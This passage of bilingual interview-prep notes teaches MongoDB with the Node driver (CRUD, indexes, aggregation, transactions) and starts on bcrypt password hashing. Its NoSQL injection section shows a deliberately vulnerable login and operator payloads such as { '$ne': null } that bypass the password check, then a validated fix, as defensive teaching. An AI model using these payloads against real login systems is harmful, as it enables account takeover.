**Time plan (about 2 hours):** 20 min concepts + connection, 30 min CRUD and operators, 40 min aggregation, 15 min indexes + SQL vs NoSQL, 15 min revision and coding.

**Learning objectives**

- Explain documents, collections, `_id` and `ObjectId`, and how they map to rows, tables and primary keys.
- Use the official `mongodb` driver (v6+) for CRUD with correct update operators.
- Design embed vs reference for a one-to-many relationship and justify it.
- Build indexes (single, compound, unique, TTL) and read `explain()` output at a basic level.
- Write aggregation pipelines with `$match`, `$group`, `$project`, `$sort`, `$unwind`, `$lookup`, `$facet`.
- Compare SQL and NoSQL honestly and answer "when would you pick MongoDB?"
- Recognize NoSQL injection and prevent it.

### 2.1 Documents, collections and the official driver `[ESSENTIAL]`

**Concept**

MongoDB mein data *documents* (BSON, JSON jaisa) ke form mein hota hai, aur documents *collections* mein rehte hain. Collection ~ table, document ~ row, field ~ column, but documents in one collection can have different shapes, and a document can contain nested objects and arrays. Har document ka `_id` hota hai (default `ObjectId`, 12 bytes, roughly time-ordered and unique) aur `_id` par automatic unique index hota hai.

**Why it matters**

Interviewers for Node roles frequently expect basic MongoDB fluency, especially CRUD, indexes and aggregation. You are not expected to be a DBA, but you should know when MongoDB fits.

**Internal working**

- BSON is a binary JSON-like format with extra types (`ObjectId`, `Date`, `Decimal128`, `Int32`, `Int64`).
- The driver keeps its own connection pool (`maxPoolSize`, default 100). One `MongoClient` per process, created once and reused (same idea as the MySQL pool).
- Writes are atomic at the single-document level, even when the document has nested arrays. Multi-document transactions exist but need a replica set (or sharded cluster) and cost performance.
- A query without a usable index does a collection scan (`COLLSCAN`), reading every document, like a full table scan.

**Code example**

```js
// src/db/mongo.js
import { MongoClient } from 'mongodb';

const client = new MongoClient(process.env.MONGODB_URI, {
  maxPoolSize: 20,
  serverSelectionTimeoutMS: 5_000, // fail fast if no server
  appName: 'week5-lab',
});

let db;

export async function connectMongo() {
  await client.connect();
  db = client.db('shop');
  return db;
}

export function getDb() {
  if (!db) throw new Error('Mongo not connected. Call connectMongo() at startup.');
  return db;
}

export async function closeMongo() {
  await client.close();
}
```

Standalone playground script (ESM; run with `node --env-file=.env playground.js`):

```js
// playground.js
import { MongoClient, ObjectId } from 'mongodb';

const client = new MongoClient(process.env.MONGODB_URI);
await client.connect(); // top-level await works in ES modules
const db = client.db('shop');

const users = db.collection('users');
const products = db.collection('products');
const orders = db.collection('orders');

await Promise.all([users.deleteMany({}), products.deleteMany({}), orders.deleteMany({})]);

// ---- Create ----
const { insertedId: userId } = await users.insertOne({
  email: 'asha@example.com',
  name: 'Asha',
  createdAt: new Date(),
});

const { insertedIds } = await products.insertMany([
  { sku: 'PIPE-20', name: 'PVC Pipe 20mm', pricePaise: 12500, stock: 100, tags: ['pipe', 'pvc'] },
  { sku: 'ELB-20', name: 'Elbow 20mm', pricePaise: 4500, stock: 250, tags: ['fitting', 'pvc'] },
  { sku: 'VAL-15', name: 'Ball Valve 15mm', pricePaise: 38000, stock: 40, tags: ['valve'] },
]);

await orders.insertMany([
  {
    userId,
    status: 'paid',
    createdAt: new Date('2026-09-10T10:00:00Z'),
    items: [
      { productId: insertedIds[0], name: 'PVC Pipe 20mm', unitPricePaise: 12500, qty: 4 },
      { productId: insertedIds[1], name: 'Elbow 20mm', unitPricePaise: 4500, qty: 10 },
    ],
    totalPaise: 4 * 12500 + 10 * 4500,
  },
  {
    userId,
    status: 'paid',
    createdAt: new Date('2026-09-11T12:30:00Z'),
    items: [{ productId: insertedIds[2], name: 'Ball Valve 15mm', unitPricePaise: 38000, qty: 2 }],
    totalPaise: 2 * 38000,
  },
  {
    userId,
    status: 'cancelled',
    createdAt: new Date('2026-09-12T09:00:00Z'),
    items: [{ productId: insertedIds[0], name: 'PVC Pipe 20mm', unitPricePaise: 12500, qty: 1 }],
    totalPaise: 12500,
  },
]);

// ---- Read ----
const pvc = await products
  .find({ tags: 'pvc', stock: { $gt: 0 } }, { projection: { _id: 0, sku: 1, name: 1, pricePaise: 1 } })
  .sort({ pricePaise: -1 })
  .limit(10)
  .toArray();
console.log(pvc);

const one = await products.findOne({ sku: 'VAL-15' }); // null if not found
console.log(one?.name);

// ---- Update (always use update operators) ----
const r1 = await products.updateOne({ sku: 'PIPE-20' }, { $set: { name: 'PVC Pipe 20mm (ISI)' }, $inc: { stock: 25 } });
console.log(r1.matchedCount, r1.modifiedCount);

// Atomic guarded decrement (same idea as the guarded SQL UPDATE on Day 1)
const r2 = await products.updateOne({ sku: 'VAL-15', stock: { $gte: 5 } }, { $inc: { stock: -5 } });
if (r2.modifiedCount !== 1) console.log('Not enough stock');

// Read-modify-write in one atomic step. In driver v6 this returns the document itself
// (in v5 and older it returned a result wrapper with .value).
const updated = await products.findOneAndUpdate(
  { sku: 'ELB-20' },
  { $inc: { stock: -1 } },
  { returnDocument: 'after' },
);
console.log(updated?.stock);

// Upsert: update if exists, insert if not
await users.updateOne(
  { email: 'ravi@example.com' },
  { $set: { name: 'Ravi' }, $setOnInsert: { createdAt: new Date() } },
  { upsert: true },
);

// ---- Delete ----
await orders.deleteOne({ status: 'cancelled' });

// Convert a string id (from req.params) into an ObjectId safely
function toObjectId(value) {
  if (typeof value !== 'string' || !ObjectId.isValid(value)) return null;
  return new ObjectId(value);
}
console.log(toObjectId('not-an-id'));

await client.close();
```

**Frontend connection**

Document model almost wahi hai jo tum frontend mein JSON state ya Redux store mein dekhte ho: nested objects, arrays of items. MongoDB ka "embed the line items inside the order" bilkul waise hai jaise React state mein `order.items` nested hota hai. Update operators (`$set`, `$inc`, `$push`) tumhare `setState` ke partial update jaise hain, except they run atomically on the server.

**Real-world scenario**

Order document with embedded items: one read returns the full order for the "My Orders" page. The unit price is copied into the item (a snapshot), so later price changes do not rewrite history. That denormalization is a deliberate feature in document modelling.

**Interview answer:**

"MongoDB stores BSON documents in collections. Each document has a unique _id, and single-document writes are atomic even with nested data. I use one MongoClient per process, which manages its own connection pool, and I use update operators such as $set and $inc instead of replacing documents. Embedding is natural for data that is read together and owned by the parent, such as order line items. The driver gives me CRUD methods, and I rely on indexes and the aggregation framework for queries beyond simple lookups."

**Follow-up questions**

1. *What is `ObjectId` made of?* A 12-byte value: a 4-byte timestamp, a 5-byte random value per process, and a 3-byte incrementing counter. That is why it is unique and roughly sortable by creation time. Do not use it as a security secret.
2. *Is `findOneAndUpdate` atomic?* Yes, for the single document it touches.
3. *What does `upsert` do and what is its danger?* It inserts when nothing matches. Without a unique index on the match field, concurrent upserts can create duplicates, so pair upserts with a unique index.
4. *What changed in driver v6 for `findOneAndUpdate`?* It returns the document (or `null`) directly by default instead of a `{ value, ok }` wrapper used in v5 and earlier. Flagged because older tutorials show the old shape.

**Common mistakes**

- Creating a new `MongoClient` per request.
- Passing a raw string where an `ObjectId` is stored (the query then matches nothing).
- Using `replaceOne` when you meant `updateOne` with operators; `replaceOne` replaces the whole document.
- Storing money as a JS float. Use integer minor units (paise) or `Decimal128`.
- Assuming "schemaless" means "no design needed".

**Revision notes**

- Document ~ row, collection ~ table; `_id` auto-indexed.
- One `MongoClient` per process; driver pools connections.
- Single-document operations are atomic; use `$set`, `$inc`, `$push`.
- Validate and convert ids with `ObjectId.isValid`.

### 2.2 Embed vs reference (data modelling) `[ESSENTIAL]`

**Concept**

Rule of thumb: *embed* data that is read together, has a bounded size, and belongs to one parent. *Reference* (store an id and look it up) data that is shared, large, unbounded, or updated independently.

| Situation | Choice | Reason |
|---|---|---|
| Order line items | Embed | Read with the order; bounded; snapshot of price |
| User profile addresses (few) | Embed | Small and owned by the user |
| Blog post with millions of comments | Reference | Unbounded growth; 16 MB document limit |
| Product used by many orders | Reference (plus snapshot of name/price in the order) | Shared data changes independently |
| Many-to-many (students and courses) | Reference arrays or a join collection | Both sides grow |

**Internal working**

A document has a 16 MB maximum size. Unbounded arrays inside a document (for example every event a user ever generated) grow until they hit that limit and also make updates slower. References require a second query or a `$lookup` (a join-like stage), which costs more than reading one document.

**Interview answer:**

"I model for the application's access patterns. If data is read together, bounded and owned by the parent, I embed it, as with order line items. If it is shared, unbounded or changes independently, I reference it by id. I often copy a few fields such as the product name and unit price into the order as a snapshot, because order history must not change when the catalog changes."

**Follow-up questions**

1. *What is the downside of embedding?* Data duplication, harder updates of shared data, document growth, and the 16 MB limit.
2. *What is the downside of referencing?* Extra queries or `$lookup`, and no foreign-key enforcement by the database.
3. *Does MongoDB enforce relationships?* No foreign keys; the application (or schema validation plus careful code) must keep references consistent.

**Common mistakes**

- Modelling like SQL (many small collections and joins everywhere) or embedding everything in one giant document.
- Unbounded arrays.
- Forgetting that a snapshot is intentional and trying to "normalize" order history.

**Revision notes**

- Embed: together, bounded, owned. Reference: shared, unbounded, independent.
- Snapshot prices in orders.
- 16 MB document limit; no FK enforcement.

### 2.3 Indexes in MongoDB `[ESSENTIAL]`

**Concept**

Index ka idea SQL jaisa hi hai (B-tree), lekin MongoDB mein fields nested ho sakte hain aur arrays bhi index hote hain (multikey index). Without an index, a filter scans the whole collection.

**Why it matters**

"My query is slow, what do you do?" -> check `explain()`, look for `COLLSCAN`, add the right index.

**Internal working**

- Compound index `{ userId: 1, createdAt: -1 }` supports queries on `userId`, and on `userId` + `createdAt`, and sorting by `createdAt` within one `userId`. It follows the *leftmost prefix* rule (see Week 4 / Day 3 notes).
- ESR guideline for compound indexes: put **E**quality fields first, then **S**ort fields, then **R**ange fields.
- Unique index enforces uniqueness (duplicate insert fails with error code 11000).
- TTL index deletes documents automatically some time after a date field (good for sessions or expiring tokens; a background task runs about once a minute, so deletion is not instant).
- Partial index indexes only documents matching a filter (smaller and faster).
- Every index slows writes and uses memory, so do not index everything.

**Code example**

```js
// src/db/mongoIndexes.js
export async function ensureIndexes(db) {
  await db.collection('users').createIndex({ email: 1 }, { unique: true });

  // ESR: equality (userId), sort (createdAt)
  await db.collection('orders').createIndex({ userId: 1, createdAt: -1 });

  // Partial index: only the documents we query by status
  await db.collection('orders').createIndex(
    { status: 1, createdAt: -1 },
    { partialFilterExpression: { status: { $in: ['pending', 'paid'] } } },
  );

  // TTL index: documents vanish ~1 hour after expiresAt
  await db.collection('password_resets').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 3600 });
}
```

```js
// Reading the plan
const plan = await db
  .collection('orders')
  .find({ userId, status: 'paid' })
  .sort({ createdAt: -1 })
  .explain('executionStats');

console.log(plan.queryPlanner.winningPlan.stage);   // look for IXSCAN, not COLLSCAN
console.log(plan.executionStats.totalDocsExamined); // should be close to nReturned
console.log(plan.executionStats.nReturned);
```

(In `explain` output the top stage may be `FETCH` over an `IXSCAN`; walk `inputStage` to find the scan type.)

**Frontend connection**

Index ka concept `Map` lookup vs `array.find()` jaisa hai: `Map.get(key)` O(1), `array.find` O(n). Index = ek pre-built Map-like structure for quick lookup.

**Real-world scenario**

"Order history" page filters by `userId` and sorts by newest. With 5 million orders and no index, every page load scans 5 million documents. With `{ userId: 1, createdAt: -1 }` MongoDB walks directly to that user's orders, already in order.

**Interview answer:**

"I create indexes from my query patterns. For a filter on equality fields plus a sort I use a compound index that follows the equality, sort, range order, and I verify with explain that the winning plan is an index scan and that documents examined is close to documents returned. I use unique indexes for invariants such as email, TTL indexes for expiring data, and I keep the number of indexes small because each one slows writes and consumes memory."

**Follow-up questions**

1. *What is a multikey index?* An index on an array field creates one index entry per array element.
2. *Does index order matter?* Yes. A compound index is usable only for queries that use a leftmost prefix of its fields, and the sort direction pattern matters for sorting.
3. *What is a covered query?* A query satisfied entirely from the index (all filtered and projected fields are in the index), so no document fetch is needed.
4. *Why is a unique index preferred over "check then insert"?* Check-then-insert races; the index is the atomic guarantee.

**Common mistakes**

- Indexing every field "just in case".
- Wrong field order in compound indexes.
- Not checking `explain` and assuming an index is used.
- Expecting TTL deletion to be instant.

**Revision notes**

- Index from query patterns; ESR rule for compound indexes.
- Verify via `explain('executionStats')`: IXSCAN and docsExamined close to nReturned.
- Unique, TTL, partial indexes are practical tools; indexes cost write speed and memory.

### 2.4 Aggregation pipeline `[ESSENTIAL]`

**Concept**

Aggregation pipeline = ek assembly line. Documents ek stage se doosre stage mein jaate hain; har stage transform karta hai. Think of `array.filter().map().reduce()` in JavaScript, jo server par chalta hai.

Common stages:

| Stage | Meaning | JS analogy |
|---|---|---|
| `$match` | filter documents | `filter` |
| `$group` | group by key and accumulate (`$sum`, `$avg`, `$min`, `$max`, `$push`, `$first`) | `reduce` into buckets |
| `$project` | include, exclude or compute fields | `map` |
| `$addFields` | add computed fields, keep the rest | `map` with spread |
| `$sort`, `$limit`, `$skip` | order and page | `sort`, `slice` |
| `$unwind` | one output document per array element | `flatMap` |
| `$lookup` | left outer join to another collection | `join` |
| `$facet` | run several sub-pipelines on the same input | multiple reductions |

**Why it matters**

Reports (revenue per day, top products, per-user spend) are common interview tasks. Doing this in JavaScript by loading all documents is slow and memory-hungry; the database should do it.

**Internal working**

- Put `$match` and `$sort` early; a leading `$match` (and `$sort`) can use an index. The optimizer can reorder some stages, but do not depend on it.
- `$group` holds groups in memory (stage memory limit is 100 MB; use `allowDiskUse: true` for large groupings).
- `$lookup` runs a lookup per input document; it performs well when the foreign field is indexed.
- `$unwind` multiplies documents (an order with 5 items becomes 5 documents), so `$match` before it.

**Code example** (continues the playground data from 2.1)

```js
// 1) Daily revenue for paid orders in a date range
const dailyRevenue = await orders
  .aggregate([
    {
      $match: {
        status: 'paid',
        createdAt: { $gte: new Date('2026-09-01T00:00:00Z'), $lt: new Date('2026-10-01T00:00:00Z') },
      },
    },
    {
      $group: {
        _id: { $dateToString: { format: '%Y-%m-%d', date: '$createdAt' } },
        orders: { $sum: 1 },
        revenuePaise: { $sum: '$totalPaise' },
        avgOrderPaise: { $avg: '$totalPaise' },
      },
    },
    { $sort: { _id: 1 } },
    {
      $project: {
        _id: 0,
        day: '$_id',
        orders: 1,
        revenuePaise: 1,
        avgOrderPaise: { $round: ['$avgOrderPaise', 0] },
      },
    },
  ])
  .toArray();
```

```js
// 2) Top 5 products by units sold, joined to the products collection
const topProducts = await orders
  .aggregate([
    { $match: { status: 'paid' } },
    { $unwind: '$items' },
    {
      $group: {
        _id: '$items.productId',
        unitsSold: { $sum: '$items.qty' },
        revenuePaise: { $sum: { $multiply: ['$items.unitPricePaise', '$items.qty'] } },
      },
    },
    { $sort: { unitsSold: -1 } },
    { $limit: 5 },
    { $lookup: { from: 'products', localField: '_id', foreignField: '_id', as: 'product' } },
    { $unwind: '$product' },
    {
      $project: {
        _id: 0,
        productId: '$_id',
        sku: '$product.sku',
        name: '$product.name',
        unitsSold: 1,
        revenuePaise: 1,
      },
    },
  ])
  .toArray();
```

```js
// 3) Per-user lifetime spend, with the user's details joined in
const spendPerUser = await orders
  .aggregate([
    { $match: { status: 'paid' } },
    { $group: { _id: '$userId', totalSpentPaise: { $sum: '$totalPaise' }, orderCount: { $sum: 1 } } },
    { $lookup: { from: 'users', localField: '_id', foreignField: '_id', as: 'user' } },
    { $unwind: '$user' },
    { $project: { _id: 0, userId: '$_id', email: '$user.email', totalSpentPaise: 1, orderCount: 1 } },
    { $sort: { totalSpentPaise: -1 } },
  ])
  .toArray();
```

```js
// 4) Paginated list plus total count in a single round trip using $facet
const page = 1;
const pageSize = 20;
const [result] = await orders
  .aggregate([
    { $match: { status: 'paid' } },
    {
      $facet: {
        data: [
          { $sort: { createdAt: -1, _id: -1 } },
          { $skip: (page - 1) * pageSize },
          { $limit: pageSize },
          { $project: { items: 0 } },
        ],
        total: [{ $count: 'count' }],
      },
    },
  ])
  .toArray();

const rows = result.data;
const total = result.total[0]?.count ?? 0;
```

SQL equivalent of example 1 for comparison (MySQL 8):

```sql
SELECT DATE(created_at)        AS day,
       COUNT(*)                AS orders,
       SUM(total_paise)        AS revenue_paise,
       ROUND(AVG(total_paise)) AS avg_order_paise
FROM orders
WHERE status = 'paid'
  AND created_at >= '2026-09-01' AND created_at < '2026-10-01'
GROUP BY DATE(created_at)
ORDER BY day;
```

**Frontend connection**

Pipeline almost exactly `orders.filter(...).flatMap(o => o.items).reduce(...)`, followed by `sort` and `slice(0, 5)`. Difference: this runs next to the data, uses indexes, and does not ship millions of documents to Node.js memory.

**Real-world scenario**

Seller dashboard on a marketplace: "revenue per day for last 30 days" and "top 5 products". These two aggregations power the dashboard cards. Running them in the database keeps the Node.js process light, and you can cache the results (Week 6 / Day 4).

**Interview answer:**

"The aggregation framework processes documents through a pipeline of stages. I filter early with $match so an index can be used, group with $group and accumulators, reshape with $project, and use $lookup for join-like enrichment. I put $match before $unwind to avoid multiplying documents, I verify the pipeline with explain, and I use allowDiskUse for very large groupings. For anything heavy I prefer doing the work in the database rather than loading documents into Node.js."

**Follow-up questions**

1. *Difference between `find` and `aggregate`?* `find` filters and projects documents; `aggregate` can also group, join, reshape and compute across documents.
2. *How do you do a join in MongoDB?* `$lookup` (left outer join). For frequent joins consider embedding or denormalizing instead.
3. *Why is `$match` first?* So the pipeline can use an index and process fewer documents.
4. *What is the 100 MB limit?* Memory per blocking stage such as `$group` or `$sort`; exceed it and the stage errors unless `allowDiskUse: true` (recent server versions enable disk use by default for many cases; still know the concept).
5. *How would you paginate a large collection?* Prefer keyset (range) pagination, for example `createdAt < lastSeen`, over large `$skip` values (see Week 3 / Day 5 and Week 4 / Day 6 notes).

**Common mistakes**

- Loading all documents with `find().toArray()` and grouping in JavaScript.
- `$unwind` before `$match`.
- Forgetting `toArray()` (aggregate returns a cursor).
- Overusing `$lookup` as if MongoDB were a relational database.
- Using `$where` or `$function` with user input (JavaScript execution, injection risk).

**Revision notes**

- Pipeline order matters: `$match` early, `$unwind` late.
- `$group` + accumulators = GROUP BY; `$lookup` = LEFT JOIN; `$facet` = multiple results in one call.
- Prefer keyset pagination for deep pages.
- Aggregation returns a cursor; call `toArray()`.

### 2.5 Transactions in MongoDB `[ADVANCED]`

Single-document operations are already atomic. When you must change several documents atomically (for example move money between two wallet documents), use a session transaction. It requires a replica set or sharded cluster.

```js
const session = client.startSession();
try {
  await session.withTransaction(async () => {
    const wallets = db.collection('wallets');
    const debit = await wallets.updateOne(
      { _id: fromId, balancePaise: { $gte: amountPaise } },
      { $inc: { balancePaise: -amountPaise } },
      { session },
    );
    if (debit.modifiedCount !== 1) throw new Error('Insufficient funds'); // aborts the transaction
    await wallets.updateOne({ _id: toId }, { $inc: { balancePaise: amountPaise } }, { session });
  });
} finally {
  await session.endSession();
}
```

`withTransaction` automatically retries on transient transaction errors, so the callback must be safe to run more than once (no external side effects inside it). If your design needs multi-document transactions all the time, that is a hint a relational database may fit better.

### 2.6 NoSQL injection `[ESSENTIAL]`

**Concept**

MongoDB queries are objects, not strings. If you pass `req.body` straight into a filter, the client can send an *operator object* instead of a string.

**NEVER DO: vulnerable login**

```js
// NEVER DO: passes untrusted objects straight into the query
app.post('/unsafe/login', async (req, res) => {
  const user = await users.findOne({
    email: req.body.email,
    password: req.body.password, // also wrong: plaintext password comparison
  });
  res.json({ ok: Boolean(user) });
});
```

Attack request body:

```json
{ "email": "admin@example.com", "password": { "$ne": null } }
```

`{ "$ne": null }` means "password is not null", which is true for every user, so the login succeeds without the password. The same attack works with `{ "$gt": "" }` or a regex.

**Fixed version**

```js
import { z } from 'zod';
import bcrypt from 'bcrypt';

const loginSchema = z.object({
  email: z.string().trim().toLowerCase().email().max(254),
  password: z.string().min(1).max(72),
}).strict(); // z.string() rejects objects such as { $ne: null }

app.post('/login', async (req, res) => {
  const { email, password } = loginSchema.parse(req.body); // throws on wrong types
  const user = await users.findOne({ email });             // email is now guaranteed to be a string
  const hash = user?.passwordHash ?? DUMMY_HASH;           // see Day 3 for the timing reason
  const ok = await bcrypt.compare(password, hash);
  if (!user || !ok) {
    return res.status(401).json({ error: { message: 'Invalid email or password' } });
  }
  res.json({ ok: true });
});
```

Defences: validate the *type* of every input (a string must be a string), never compare plaintext passwords, never use `$where` or server-side JavaScript with user input, and keep the DB user least-privileged. Libraries such as `express-mongo-sanitize` strip `$`-prefixed keys, but schema validation is the stronger fix.

**Interview answer:**

"NoSQL injection happens when untrusted input becomes part of a query object, for example a client sending { "$ne": null } where a password string was expected. I prevent it by validating that each input has the expected primitive type before it reaches the driver, by never putting request bodies directly into filters, by avoiding $where and server-side JavaScript, and by comparing password hashes rather than plaintext."

**Follow-up questions**

1. *Is NoSQL immune to injection because there is no SQL?* No. The injection point is the query structure; MongoDB just represents it with objects and operators.
2. *Does `express.json()` make this worse?* It parses nested JSON, so objects reach your handler; that is why validation at the boundary matters.

**Common mistakes**

- Trusting `req.body` shape.
- Using `req.query` objects directly (with the "extended" query parser `?password[$ne]=1` becomes an object; Express 5 changed the default query parser to "simple", but never rely on that for security).

**Revision notes**

- Validate types, not just presence.
- Operators in input = injection.
- Never `$where` with user data.

### 2.7 SQL vs NoSQL: how to answer honestly `[ESSENTIAL]`

| Topic | MySQL (relational) | MongoDB (document) |
|---|---|---|
| Data shape | Fixed schema, normalized tables | Flexible documents, nested data |
| Relationships | Foreign keys, joins | Embed or reference; `$lookup` available |
| Transactions | Mature, multi-row ACID | Single-document atomic; multi-document supported but costlier |
| Consistency model | Strong by default | Configurable (write concern, read concern); strong on primary |
| Scaling | Vertical first; read replicas; sharding is harder | Built-in sharding and replica sets |
| Query power | Rich SQL, joins, window functions | Aggregation pipeline; weaker for many-table joins |
| Best fit | Payments, inventory, anything relational with strict integrity | Catalogs, content, events/logs, varying attributes |
| Pitfall | Schema changes on huge tables | Data duplication, missing integrity, unbounded documents |

Rules of thumb:

- Money, orders, inventory, anything where integrity and joins matter -> start with MySQL/PostgreSQL.
- Product catalogs with very different attributes per category (pipes vs valves vs fittings), activity feeds, and content -> MongoDB is a natural fit.
- Many real systems use both: MySQL as the system of record, MongoDB (or Elasticsearch/Redis) for specific read models.

**Interview answer:**

"I choose based on data shape, consistency needs and access patterns, not on trends. For transactional data with strong relationships, such as payments and inventory, I start with a relational database because of ACID transactions, constraints and joins. For flexible, document-shaped, read-heavy data such as catalogs or content, MongoDB is a good fit and horizontal scaling is easier. Both can coexist: the relational database remains the system of record and a document store serves a specific read model."

**Follow-up questions**

1. *Does NoSQL scale better automatically?* It makes horizontal scaling easier for some access patterns, but you pay with weaker joins and more application-level consistency work. A well-indexed single MySQL server handles a lot of traffic.
2. *Can MongoDB do ACID?* Yes for single documents always, and for multi-document transactions on replica sets, with performance cost.
3. *When is MongoDB a bad choice?* When data is highly relational and integrity-critical, such as ledgers, and the team ends up re-implementing joins and constraints in application code.

**Common mistakes**

- "NoSQL is faster" or "SQL does not scale" generalizations.
- Picking MongoDB to avoid learning schema design.
- Ignoring consistency when using multiple data stores.

**Revision notes**

- Decide by data shape + consistency + access patterns.
- SQL for integrity-heavy relations; Mongo for flexible, nested, read-shaped data.
- Polyglot persistence is common; state the system of record clearly.

### Day 2 wrap-up

**Key concepts to remember**

- Document, collection, `_id`/`ObjectId`; single-document atomicity.
- One `MongoClient` per process; update operators; `findOneAndUpdate` returns the doc in driver v6.
- Embed what is read together and bounded; reference what is shared or unbounded.
- Compound index ESR rule; verify with `explain('executionStats')`.
- Aggregation: `$match` early, `$group`, `$lookup`, `$unwind`, `$facet`.
- NoSQL injection comes from untrusted operator objects; validate types.

**Five revision questions**

1. When do you embed and when do you reference? Give an order/product example.
2. Why does a compound index `{ userId: 1, createdAt: -1 }` help "latest orders of a user"?
3. Write a pipeline that returns revenue per day for paid orders.
4. How does `{ "password": { "$ne": null } }` bypass a naive login and how do you stop it?
5. Name two reasons you might choose MySQL over MongoDB for a payments system.

**One practical coding task**

Using the playground data, write an aggregation that returns, for each product tag, the total units sold across paid orders (hint: `$unwind` items, `$lookup` product, `$unwind` tags, `$group`). Add the indexes that support it and show `explain` output for the first `$match`. Compare with the SQL you would write (needs a `product_tags` join table). Related: `Q-MONGO-xx` in the question bank.

**Self-assessment checklist**

- [ ] I can explain document vs row and `_id` vs primary key.
- [ ] I can write `$match`, `$group`, `$lookup`, `$unwind` pipelines without notes.
- [ ] I can design a compound index using ESR and verify it with explain.
- [ ] I can explain NoSQL injection with the `$ne` example.
- [ ] I can give a balanced SQL vs NoSQL answer with a concrete example.

---

## Day 3 - Signup/login APIs, bcrypt, JWT structure and verification

**Time plan (about 2 hours):** 35 min password hashing, 30 min signup/login code, 30 min JWT structure + verification, 15 min attacks on JWT, 10 min revision.

**Learning objectives**

- Explain why passwords are hashed (not encrypted), why a slow, salted hash is required, and how bcrypt achieves it.
- Build signup and login endpoints with validation, normalized emails, safe error messages and timing-attack resistance.
- Describe the JWT structure (header, payload, signature), what is and is not protected, and how verification works.
- Sign and verify JWTs with an explicit algorithm, issuer, audience and expiry.
- Explain the `alg: none` and algorithm-confusion attacks and how pinning the algorithm stops them.

### 3.1 Password hashing with bcrypt `[ESSENTIAL]`

**Concept**

Password kabhi plain text mein store nahi karte. Agar DB leak ho jaye (backup chori, SQL injection, insider), toh attacker ko sab passwords mil jayenge, aur log same password multiple sites par use karte hain. Isliye hum *one-way hash* store karte hain: hash se original password wapas nahi nikalta; login par user ka password dubara hash karke compare karte hain.

Encryption vs hashing: encryption reversible hai (key se decrypt), hashing one-way. Passwords ke liye hashing chahiye.

Normal fast hashes (MD5, SHA-1, plain SHA-256) passwords ke liye galat hain, kyunki GPU par billions of guesses per second possible hain. Password hashing algorithms (bcrypt, scrypt, argon2) jaan-boojhkar *slow* aur configurable hote hain.

**Why it matters**

"How do you store passwords?" lagbhag har backend interview mein aata hai. Wrong answers (MD5, SHA-256 without salt, encrypting passwords) are instant red flags.

**Internal working**

- **Salt**: a random value generated per password and stored inside the hash string. It makes identical passwords produce different hashes and defeats precomputed rainbow tables. You do not store salt separately with bcrypt.
- **Cost factor** (work factor): bcrypt's `cost` (also called rounds) is exponential: cost 12 means 2^12 iterations of the expensive key setup. Each +1 doubles the time. Choose the highest cost where login takes roughly 100-300 ms on your production hardware; 12 is a common modern default (OWASP's minimum guidance for bcrypt is 10; many teams use 12).
- The output looks like `$2b$12$<22 chars salt><31 chars hash>`: algorithm version, cost, salt, hash. `bcrypt.compare` reads cost and salt from the stored string, so you can raise the cost later and old hashes still verify.
- **72-byte limit**: bcrypt only uses the first 72 bytes of the password. Longer input is silently truncated (in some implementations). Validate a maximum length (72 bytes) or pre-hash carefully; do not let users think a 200-character password adds strength.
- **Thread pool**: the native `bcrypt` package runs hashing on the libuv thread pool, so `await bcrypt.hash()` does not block the event loop. But the pool has only 4 threads by default (`UV_THREADPOOL_SIZE`), so 50 simultaneous logins at cost 12 queue up and also delay other thread-pool work such as `fs` and `crypto` calls (Week 2 / Day 2 notes). The pure-JS `bcryptjs` runs on the main thread in slices and is slower; avoid it for production load.
- **Alternatives**: `argon2` (Argon2id) is the current OWASP first choice; it is memory-hard, which resists GPU attacks better. `scrypt` is also memory-hard and built into Node (`crypto.scrypt`, no dependency). bcrypt remains widely used, supported and acceptable. In an interview: "bcrypt is fine and widely deployed; Argon2id is the modern recommendation if I have a free choice."

**Code example**

```js
// src/services/password.js
import bcrypt from 'bcrypt';
import { config } from '../config.js';

export function hashPassword(plain) {
  return bcrypt.hash(plain, config.bcryptCost); // salt is generated and embedded automatically
}

export function verifyPassword(plain, storedHash) {
  return bcrypt.compare(plain, storedHash);     // constant-time comparison inside
}

// A valid bcrypt hash of a throwaway string, computed once at startup.
// Used to keep login timing the same when the email does not exist (see 3.2).
export const DUMMY_HASH = await hashPassword('not-a-real-password-for-timing-only');

// Should we upgrade an old hash to a higher cost after a successful login?
export function needsRehash(storedHash) {
  const cost = Number(storedHash.split('$')[2]);
  return cost < config.bcryptCost;
}
```

Argon2id alternative (if you install the `argon2` package; shown for comparison):

```js
// import argon2 from 'argon2';
// const hash = await argon2.hash(plain, { type: argon2.argon2id });
// const ok = await argon2.verify(hash, plain);
```

**Frontend connection**

Frontend par tum password field ko `type="password"` karte ho aur HTTPS par bhejte ho; hash karna server ka kaam hai. Client-side hashing se password ka "hash" hi naya password ban jata hai (agar leak ho toh attacker wahi hash replay kar sakta hai), isliye server-side slow hashing hi sahi hai. Ek aur frontend-side connection: bcrypt cost ka concept "debounce/throttle" jaisa hai but reversed: hum intentionally attacker ko slow karte hain.

**Real-world scenario**

Fintech app breach: attacker ko `users` table ka dump mil gaya. Agar passwords SHA-256 mein the, toh common passwords minutes mein crack ho jaate. bcrypt cost 12 mein har guess ~250 ms leta hai, toh attacker ki speed bahut girti hai, aur salt ki wajah se har user ko alag crack karna padta hai.

**Interview answer:**

"I never store passwords in plain text or with a fast hash. I use a slow, salted, adaptive password hashing function, bcrypt with a cost of about 12 or Argon2id, so a database leak does not let an attacker recover passwords quickly. The salt is random per password and stored inside the hash string, and the cost factor can be raised over time. Login compares the supplied password against the stored hash with the library's compare function, which is constant-time. I also cap password length because bcrypt only uses the first 72 bytes."

**Follow-up questions**

1. *Hashing vs encryption vs encoding?* Hashing is one-way, encryption is reversible with a key, encoding (Base64) is reversible by anyone and gives no security.
2. *Why is a salt needed if bcrypt is slow?* Without salts, identical passwords share identical hashes and attackers can precompute tables once and reuse them against every user; a per-user salt forces them to attack each hash separately.
3. *How do you choose the cost factor?* Benchmark on production hardware so one hash takes about 100-300 ms, and revisit it every year or two. Higher costs also raise the login CPU load, so factor in thread pool size and rate limiting.
4. *What is a pepper?* A secret value mixed into the hash (often via HMAC) and stored outside the database (in a secret manager). It helps if only the DB leaks. It adds operational complexity and rotation problems; treat it as [ADVANCED].
5. *Why not SHA-256 with a salt?* It is designed to be fast; GPUs compute billions per second. Password hashes must be slow and ideally memory-hard.
6. *Does bcrypt block the event loop?* The native package does the work on the libuv thread pool, so the event loop stays free, but the pool has 4 threads by default and can saturate under many concurrent logins.

**Common mistakes**

- MD5/SHA-1/SHA-256 for passwords, or "encrypting" passwords.
- Custom or home-made hashing schemes.
- A hard-coded salt shared by all users.
